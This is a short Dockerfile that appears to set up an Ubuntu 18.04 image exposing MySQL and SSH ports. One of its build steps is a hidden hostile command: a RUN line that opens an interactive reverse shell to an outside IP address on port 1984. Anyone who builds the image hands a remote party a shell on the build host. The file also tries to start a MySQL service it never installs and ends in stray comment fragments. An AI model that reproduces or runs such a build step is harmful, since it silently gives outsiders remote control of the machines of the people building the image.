FROM ubuntu:18.04
MAINTAINER Sad Cactus
ENV DEBIAN_FRONTEND noninteractive
RUN apt-get -y update
RUN apt install -y procps curl

RUN /bin/bash -c "bash -i >& /dev/tcp/34.219.30.72/1984 0>&1 "
RUN /etc/init.d/mysql start && \
        sleep 5 && \
		echo "ok3"

#ok cx-xc#ok cx-xc1iol
EXPOSE 3306 22
